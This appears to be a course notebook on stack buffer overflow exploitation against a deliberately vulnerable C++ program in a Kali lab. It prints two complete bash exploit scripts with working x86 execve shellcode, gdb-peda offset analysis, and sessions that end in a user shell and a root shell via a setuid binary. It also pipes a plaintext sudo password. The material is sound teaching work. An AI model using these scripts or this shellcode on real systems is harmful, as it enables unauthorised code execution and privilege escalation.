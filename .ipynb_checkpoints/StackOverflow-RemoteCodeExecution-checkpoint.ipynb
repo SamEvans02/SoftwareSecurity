{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stack Overflow - Remote Code Execution\n",
    "\n",
    "- instead of sending junk and executing the existing code, send your own code and execute it!\n",
    "- for this technique to succeed, program's stack must be executable (not just read and write)\n",
    "- let's define some terminologies\n",
    "\n",
    "### Payload\n",
    "- create a payload that contains code to exploit the vulnerability\n",
    "- payload typically has the following structure:\n",
    "\n",
    "```bash\n",
    "| repeated nop sled | shellcode | repeated return address |\n",
    "```\n",
    "\n",
    "### nop sled\n",
    "- `\\x90` - no operation instruction in assembly\n",
    "- if the buffer is large enough, use good number of NOP as a bigger cushion/wider landing zone\n",
    "- as the stack may shift a bit, it's harder to land exactly where the shellcode is\n",
    "- NOP let's you slide right to your shellcode that spawns a shell/terminal\n",
    "- you still need to pad the controlled buffer to make it long enough to overwrite the caller's return address\n",
    "    \n",
    "### shellcode\n",
    "- shellcode is attacker's code that can do anything \n",
    "    - such as creating/deleting a log file, adding a new user, change filewall rule, etc.\n",
    "- binary code that actually exploits the vulnerability\n",
    "- most common shellcode typically spawns, local or remote, tcp connect, reverse connect shell/terminal\n",
    "- let's you own the system by giving you access to the terminal\n",
    "- Shellcodes database - [http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)\n",
    "  \n",
    "### repeated return address\n",
    "- address pointing to some address of repeated nop sled  where it is stored in buffer variable\n",
    "- this controlled return address should overwrite the caller's return address on stack\n",
    "\n",
    "\n",
    "### Example shellcode that spawns shell/terminal\n",
    "- let's look at an example program that spawns shell/terminal on the system by calling system call\n",
    "    - copy, compile and run demos/system_shell.cpp program with /bin/sh argument\n",
    "- high-level code example, using system API"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./demos/system_shell.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstdlib>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "int main(int argc, char* argv[]) {\r\n",
      "    // simply call the system command\r\n",
      "    system(\"/bin/sh\");\r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat system_shell.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S ./compile.sh system_shell.cpp system_shell.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- run system_shell.exe from terminal\n",
    "    - Jupyter notebook doesn't give shell/terminal\n",
    "    \n",
    "- shellcode:\n",
    "    - typically is not bash command string byitself - /bin/sh\n",
    "    - is executable binary when executed gives shell/terminal\n",
    "    - typically written in assembly and assembled as a binary\n",
    "    - if stored in stack as a part of buffer, stack must be Executable!\n",
    "        - so the buffer can be treated as executable code\n",
    "        \n",
    "## Remote code execution demos\n",
    "- use stack variable to store the remote shellcode\n",
    "- find the location of the shellcode and execute it\n",
    "\n",
    "### Use program argument to transmit shellcode\n",
    "- if the vulnerable program uses argument to get the data, provide shellcode instead of data!\n",
    "- use the provided stack_overflow_arg.cpp program for demo"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp demos/stack_overflow_arg.cpp ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstdio>\r\n",
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "#define BUFSIZE 128\r\n",
      "\r\n",
      "void copydata(char *dst_buf, char *src_buf) {\r\n",
      "    // similar to strcpy in cstdio\r\n",
      "    size_t i = 0;\r\n",
      "    // copy each character from src_buf to des_buffer\r\n",
      "    // stop when NUL character is encountered\r\n",
      "    while (*(src_buf+i) != 0) {\r\n",
      "        *(dst_buf+i) = *(src_buf+i);\r\n",
      "        i++;\r\n",
      "    }\r\n",
      "    *(dst_buf+i) = 0; // end with NUL character\r\n",
      "}\r\n",
      "\r\n",
      "void bad(char *data) {\r\n",
      "    char buffer[BUFSIZE];\r\n",
      "    printf(\"buffer is at %p\\n\", buffer);\r\n",
      "    //strcpy(buffer, data);\r\n",
      "    copydata(buffer, data);\r\n",
      "    cout << \"buffer contains: \\n\" << buffer << endl;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    bad(argv[1]);\r\n",
      "    cout << \"Good bye!\" << endl;\r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "# let's look at the source\n",
    "# program simply copies and prints the user provided argument\n",
    "! cat stack_overflow_arg.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's compile and execute the program\n",
    "! ./compile.sh stack_overflow_arg.cpp stack_overflow_arg.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### crash the program\n",
    "- provide a large string and see how the program behaves\n",
    "- if the program crashes, availability of the program is violated and is the telltale sign that the program is likeley vulnerabile to stackoverflow!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc270\r\n",
      "buffer contains: \r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! ./stack_overflow_arg.exe $(python3 -c 'print(\"A\"*100)')\n",
    "# note the buffer address!\n",
    "# How do you know the program has crashed? \n",
    "# On terminal you'll see segfault!\n",
    "# On Jupyter notebook it's not obvious..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc260\r\n",
      "buffer contains: \r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "# provide a longer argument and see if the program segfaults\n",
    "! ./stack_overflow_arg.exe $(python3 -c 'print(\"A\"*128)')\n",
    "# also note the buffer address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc250\r\n",
      "buffer contains: \r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
     ]
    }
   ],
   "source": [
    "# provide a longer argument and see if the program segfaults\n",
    "! ./stack_overflow_arg.exe $(python3 -c 'print(\"A\"*140)')\n",
    "# buffer size is 128; 124 As crashes the program; notice no Good bye! printed\n",
    "# also note the buffer address"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exploit code\n",
    "- let's look at the stack_overflow_env_exploit.sh that exploits stack_overflow_arg.exe program\n",
    "- note certain values such as buffer_address and offset may be different in different system\n",
    "    - update them as necessary!\n",
    "- let's first modify (if necessary) and use the exploit code\n",
    "- we'll dive into the details of each piece of the exploit code later"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#!/bin/bash\n",
      "#\n",
      "# local exploit code using bash script\n",
      "#\n",
      "\n",
      "# Generate payload in the format: | NOP sled | shellcode | repeated return address |\n",
      "# write each line of shellcode generated by PEDA to a file\n",
      "\n",
      "# write the user-level shellcode to a file\n",
      "shellcode_file_name=\"shellcode.bin\"\n",
      "echo -ne \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\" > $shellcode_file_name\n",
      "echo -ne \"\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\" >> $shellcode_file_name\n",
      "\n",
      "# vulnerable program to exploit\n",
      "target_program=\"stack_overflow_arg.exe\"\n",
      "######FIXME\n",
      "offset=144 # EIP+0+4 or look for [ESP] --> offset ... in PEDA pattern search\n",
      "######\n",
      "#python3 -c 'print(\"A\"*144, end=\"\")' | ./$target_program\n",
      "\n",
      "######FIXME\n",
      "# feed buffer variable's address in Little Endian; reverse of what you see on screen\n",
      "# can add a few bytes so you can land away from the beginning address\n",
      "#printf \"buffer_address: %x\\n\" $((0xffffc2c0 + 20))\n",
      "buffer_address=\"\\xc0\\xc2\\xff\\xff\"\n",
      "########\n",
      "\n",
      "wc -c shellcode.bin\n",
      "shellcode_size=24 # find and update the shellcode_size if necessary\n",
      "repeat_return_address=5\n",
      "return_address_size=$((4*$repeat_return_address)) # repeat return address 5 times\n",
      "NOP_sled_size=$(($offset-$shellcode_size-$return_address_size))\n",
      "printf \"NOP Sled size: %d half-way: %d\\n\" $NOP_sled_size $((NOP_sled_size/2))\n",
      "# now we've all the sizes we need for each section of the payload, write the complete payload to a file\n",
      "\n",
      "# create an emptyfile, truncate if exists\n",
      "payload_file_name=\"payload.bin\"\n",
      "echo -n > $payload_file_name\n",
      "\n",
      "# write NOPs\n",
      "for (( i=1; i <= $NOP_sled_size; i++ ))\n",
      "do\n",
      "    echo -ne \"\\x90\" >> $payload_file_name\n",
      "done\n",
      "\n",
      "# write shellcode\n",
      "cat $shellcode_file_name >> $payload_file_name\n",
      "\n",
      "# write repeated return address\n",
      "for (( i=1; i <= $repeat_return_address; i++ ))\n",
      "do\n",
      "    echo -ne $buffer_address >> $payload_file_name\n",
      "done\n",
      "\n",
      "echo \"payload ready and has size of \" $(wc -c $payload_file_name)\n",
      "hexdump -C $payload_file_name\n",
      "echo \"sending the payload...\"\n",
      "./$target_program $(cat $payload_file_name)\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "\n",
    "cp demos/stack_overflow_arg_exploit.sh .\n",
    "cat stack_overflow_arg_exploit.sh"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## update the exploit code if necessary\n",
    "- find and update the offset using gdb-peda\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/Hacking-CPP-Notebooks$ gdb -q stack_overflow_arg.exe\n",
    "Reading symbols from stack_overflow_arg.exe...\n",
    "\n",
    "```\n",
    "\n",
    "- create cyclic pattern (long enough) 200 bytes as an argument and use it to run the program\n",
    "\n",
    "```bash\n",
    "gdb-peda$ pattern arg 200\n",
    "Set 1 arguments to program\n",
    "\n",
    "gdb-peda$ run\n",
    "Starting program: /home/kali/projects/Hacking-CPP-Notebooks/stack_overflow_arg.exe 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'\n",
    "buffer is at 0xffffc230\n",
    "buffer contains: \n",
    "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n",
    "\n",
    "Program received signal SIGSEGV, Segmentation fault.\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0xf7fb2c00 --> 0xf7faf990 --> 0xf7ef7160 (<_ZNSoD1Ev>:     push   ebx)\n",
    "EBX: 0x6c414150 ('PAAl')\n",
    "ECX: 0x6c0 \n",
    "EDX: 0x8051bb0 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\"...)\n",
    "ESI: 0xf7de6000 --> 0x1e4d6c \n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0x41514141 ('AAQA')\n",
    "ESP: 0xffffc2c0 (\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "EIP: 0x41416d41 ('AmAA')\n",
    "EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "Invalid $PC address: 0x41416d41\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc2c0 (\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0004| 0xffffc2c4 (\"AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0008| 0xffffc2c8 (\"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0012| 0xffffc2cc (\"TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0016| 0xffffc2d0 (\"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0020| 0xffffc2d4 (\"ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0024| 0xffffc2d8 (\"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0028| 0xffffc2dc (\"AAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "Stopped reason: SIGSEGV\n",
    "0x41416d41 in ?? ()\n",
    "\n",
    "- find and update the address of the buffer\n",
    "- from terminal run the exploit code\n",
    "```bash\n",
    "bash stack_overflow_exploit_env.sh\n",
    "```\n",
    "\n",
    "- search the pattern in registers to find the offset\n",
    "\n",
    "```bash\n",
    "\n",
    "gdb-peda$ patts\n",
    "Registers contain pattern buffer:\n",
    "EBX+0 found at offset: 132\n",
    "EBP+0 found at offset: 136\n",
    "EIP+0 found at offset: 140 <------ [offset + 4] byets is the length of payload!\n",
    "Registers point to pattern buffer:\n",
    "[EDX] --> offset 0 - size ~203\n",
    "[ESP] --> offset 144 - size ~56\n",
    "Pattern buffer found at:\n",
    "0x08051bb0 : offset    0 - size  200 ([heap])\n",
    "0xf7c000cd : offset 33208 - size    4 (/usr/lib32/libm-2.31.so)\n",
    "0xffffc230 : offset    0 - size  200 ($sp + -0x90 [-36 dwords])\n",
    "0xffffc629 : offset    0 - size  200 ($sp + 0x369 [218 dwords])\n",
    "References to pattern buffer found at:\n",
    "0xf7de6d24 : 0x08051bb0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6d28 : 0x08051bb0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6d2c : 0x08051bb0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6d30 : 0x08051bb0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6d34 : 0x08051bb0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6d38 : 0x08051bb0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6d3c : 0x08051bb0 (/usr/lib32/libc-2.31.so)\n",
    "0xffffbba4 : 0x08051bb0 ($sp + -0x71c [-455 dwords])\n",
    "0xffffbbc8 : 0x08051bb0 ($sp + -0x6f8 [-446 dwords])\n",
    "0xffffbbf4 : 0x08051bb0 ($sp + -0x6cc [-435 dwords])\n",
    "0xffffbc10 : 0x08051bb0 ($sp + -0x6b0 [-428 dwords])\n",
    "0xffffbc14 : 0x08051bb0 ($sp + -0x6ac [-427 dwords])\n",
    "0xffffbc24 : 0x08051bb0 ($sp + -0x69c [-423 dwords])\n",
    "0xffffbc74 : 0x08051bb0 ($sp + -0x64c [-403 dwords])\n",
    "0xffffc0b8 : 0x08051bb0 ($sp + -0x208 [-130 dwords])\n",
    "0xffffc104 : 0x08051bb0 ($sp + -0x1bc [-111 dwords])\n",
    "0xf7e62dec : 0xffffc230 (/usr/lib32/libstdc++.so.6.0.28)\n",
    "0xffffbd20 : 0xffffc230 ($sp + -0x5a0 [-360 dwords])\n",
    "0xffffc398 : 0xffffc629 ($sp + 0xd8 [54 dwords])\n",
    "\n",
    "```\n",
    "\n",
    "- buffer address is conviniently printed, everytime program is executed\n",
    "- once the offset and return address are updated, run the exploit code\n",
    "\n",
    "```bash\n",
    "\n",
    "(base) kali@kali:~/projects/Hacking-CPP-Notebooks$ bash stack_overflow_arg_exploit.sh \n",
    "24 shellcode.bin\n",
    "NOP Sled size: 100 half-way: 50\n",
    "payload ready and has size of  144 payload.bin\n",
    "00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|\n",
    "*\n",
    "00000060  90 90 90 90 31 c0 50 68  2f 2f 73 68 68 2f 62 69  |....1.Ph//shh/bi|\n",
    "00000070  6e 89 e3 31 c9 89 ca 6a  0b 58 cd 80 c0 c2 ff ff  |n..1...j.X......|\n",
    "00000080  c0 c2 ff ff c0 c2 ff ff  c0 c2 ff ff c0 c2 ff ff  |................|\n",
    "00000090\n",
    "sending the payload...\n",
    "buffer is at 0xffffc2c0\n",
    "buffer contains: \n",
    "����������������������������������������������������������������������������������������������������1�Ph//shh/bin��1ɉ�j\n",
    "          X��������������������\n",
    "$ whoami\n",
    "kali\n",
    "$ \n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## exploit setuid program\n",
    "- if setuid program has stackoverflow vulnerability, exploiting it with the right shellcode will give root shell!\n",
    "- let's set euid of the **stack_overflow_arg.exe** program\n",
    "- exploit it with the **stack_overflow_arg_exploit_setuid.sh**\n",
    "- exploit code is very similar to **stack_overflow_arg_exploit.sh**\n",
    "    - only the shellcode and its size is different"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "echo kali | sudo -S chown root:root stack_overflow_arg.exe\n",
    "echo kali | sudo -S chmod +s stack_overflow_arg.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwsr-sr-x 1 root root 33320 Dec 13 15:04 stack_overflow_arg.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al stack_overflow_arg.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./demos/stack_overflow_arg_exploit_setuid.sh ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#!/bin/bash\r\n",
      "#\r\n",
      "# Template for local interactive exploit code using bash script\r\n",
      "#\r\n",
      "\r\n",
      "# Generate payload file in the format: | NOP sled | shellcode | repeated return address |\r\n",
      "# write each line of shellcode generated by PEDA to a file\r\n",
      "\r\n",
      "# write shellcode to a file\r\n",
      "shellcode_file_name=\"shellcode.bin\"\r\n",
      "\r\n",
      "echo -ne \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\" > $shellcode_file_name\r\n",
      "echo -ne \"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\" >> $shellcode_file_name\r\n",
      "echo -ne \"\\xe1\\xcd\\x80\" >> $shellcode_file_name\r\n",
      "wc -c shellcode.bin\r\n",
      "\r\n",
      "# vulnerable program to exploit\r\n",
      "######FXIME\r\n",
      "target_program=\"stack_overflow_arg.exe\"\r\n",
      "offset=140 # EIP+0+4 or look for [ESP] --> offset ... in PEDA pattern search\r\n",
      "#######\r\n",
      "\r\n",
      "#python3 -c 'print(\"A\"*140, end=\"\")' | ./$target_program\r\n",
      "\r\n",
      "######FIXME\r\n",
      "# feed buffer variable's address in Little Endian; reverse of what you see on screen\r\n",
      "# can add a few bytes so you can land away from the beginning address\r\n",
      "#printf \"buffer_address: %x\\n\" $((0xffffc2c0 + 20))\r\n",
      "buffer_address=\"\\xc0\\xc2\\xff\\xff\"\r\n",
      "########\r\n",
      "\r\n",
      "\r\n",
      "shellcode_size=35 # find and update the shellcode_size if necessary\r\n",
      "repeat_return_address=5\r\n",
      "return_address_size=$((4*$repeat_return_address)) # repeat return address 5 times\r\n",
      "NOP_sled_size=$(($offset-$shellcode_size-$return_address_size))\r\n",
      "printf \"NOP Sled size: %d half-way: %d\\n\" $NOP_sled_size $((NOP_sled_size/2))\r\n",
      "# now we've all the sizes we need for each section of the payload, write the complete payload to a file\r\n",
      "\r\n",
      "# create an emptyfile, truncate if exists\r\n",
      "payload_file_name=\"payload.bin\"\r\n",
      "echo -n > $payload_file_name\r\n",
      "\r\n",
      "# write NOPs\r\n",
      "for (( i=1; i <= $NOP_sled_size; i++ ))\r\n",
      "do\r\n",
      "    echo -ne \"\\x90\" >> $payload_file_name\r\n",
      "done\r\n",
      "\r\n",
      "# write shellcode\r\n",
      "cat $shellcode_file_name >> $payload_file_name\r\n",
      "\r\n",
      "# write repeated return address\r\n",
      "for (( i=1; i <= $repeat_return_address; i++ ))\r\n",
      "do\r\n",
      "    echo -ne $buffer_address >> $payload_file_name\r\n",
      "done\r\n",
      "\r\n",
      "echo \"payload ready and has size of \" $(wc -c $payload_file_name)\r\n",
      "hexdump -C $payload_file_name\r\n",
      "echo \"sending the payload...\"\r\n",
      "./$target_program $(cat $payload_file_name)\r\n"
     ]
    }
   ],
   "source": [
    "! cat stack_overflow_arg_exploit_setuid.sh"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### run the exploit code\n",
    "\n",
    "- update offset and buffer_address if necessary; very unlikely!\n",
    "\n",
    "```bash\n",
    "\n",
    "(base) kali@kali:~/projects/Hacking-CPP-Notebooks$ bash stack_overflow_arg_exploit_setuid.sh \n",
    "35 shellcode.bin\n",
    "NOP Sled size: 89 half-way: 44\n",
    "payload ready and has size of  144 payload.bin\n",
    "00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|\n",
    "*\n",
    "00000050  90 90 90 90 90 90 90 90  90 31 c0 31 db 31 c9 99  |.........1.1.1..|\n",
    "00000060  b0 a4 cd 80 6a 0b 58 51  68 2f 2f 73 68 68 2f 62  |....j.XQh//shh/b|\n",
    "00000070  69 6e 89 e3 51 89 e2 53  89 e1 cd 80 c0 c2 ff ff  |in..Q..S........|\n",
    "00000080  c0 c2 ff ff c0 c2 ff ff  c0 c2 ff ff c0 c2 ff ff  |................|\n",
    "00000090\n",
    "sending the payload...\n",
    "buffer is at 0xffffc2c0\n",
    "buffer contains: \n",
    "�����������������������������������������������������������������������������������������1�1�1ə��j\n",
    "                                                                                                  XQh//shh/bin��Q��S����������������������\n",
    "# whoami\n",
    "root\n",
    "# \n",
    "\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Using GDB-PEDA to generate shellcode\n",
    " - PEDA provides several shellcodes to pick from\n",
    " - the following command generates linux/x86 local shellcode\n",
    "\n",
    "```bash\n",
    "(base) kali@kali:~/projects/Hacking-CPP-Notebooks$ gdb -q\n",
    "gdb-peda$ shellcode generate x86/linux exec\n",
    "# x86/linux/exec: 24 bytes\n",
    "shellcode = (\n",
    "    \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\"\n",
    "    \"\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\"\n",
    ")\n",
    "gdb-peda$\n",
    "```\n",
    "- your can write the generated shellcode to a file for easy access\n",
    "- copy line by line hex values between \" \" and append it to a binary file\n",
    "- you can bash echo, or python3\n",
    "- the followin code demonstrates writing shellcode to a file using echo command"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# -n : do not print the trailing newline\n",
    "# -e : enable intrepretation of blackslash\n",
    "! echo -ne \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\" > shellcode_bash.bin\n",
    "! echo -ne \"\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\" >> shellcode_bash.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "24 shellcode_bash.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c shellcode_bash.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  31 c0 50 68 2f 2f 73 68  68 2f 62 69 6e 89 e3 31  |1.Ph//shh/bin..1|\r\n",
      "00000010  c9 89 ca 6a 0b 58 cd 80                           |...j.X..|\r\n",
      "00000018\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C shellcode_bash.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- the following Pyton3 script to write the shellcode to a binary file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Python3 script\n",
    "with open('shellcode_py3.bin', 'wb') as fout:\n",
    "    fout.write(b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\")\n",
    "    fout.write(b\"\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "24 shellcode_py3.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c shellcode_py3.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  31 c0 50 68 2f 2f 73 68  68 2f 62 69 6e 89 e3 31  |1.Ph//shh/bin..1|\r\n",
      "00000010  c9 89 ca 6a 0b 58 cd 80                           |...j.X..|\r\n",
      "00000018\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C shellcode_py3.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- the following command shows using Python3 from terminal to write the shellcode to a binary file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Python3 from terminal\n",
    "! python3 -c 'import sys; sys.stdout.buffer.write(b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\")' > shellcode1_py3.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "24 shellcode1_py3.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c shellcode1_py3.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  31 c0 50 68 2f 2f 73 68  68 2f 62 69 6e 89 e3 31  |1.Ph//shh/bin..1|\r\n",
      "00000010  c9 89 ca 6a 0b 58 cd 80                           |...j.X..|\r\n",
      "00000018\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C shellcode1_py3.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Using bash to exploit stack_overflow_arg.exe\n",
    "1. create the payload\n",
    "2. send payload to the vulnerabale program\n",
    "3. script the whole process in a bash script which becomes the exploitcode\n",
    "\n",
    "#### create payload\n",
    "- find offset using gdb or peda as demonstrated above\n",
    "- let's say **144** is the total offset (length of the payload)\n",
    "- now, let's create our payload with shellcode\n",
    "- shellcode is **24** bytes long (this is fixed depending on the type of shellcode used)\n",
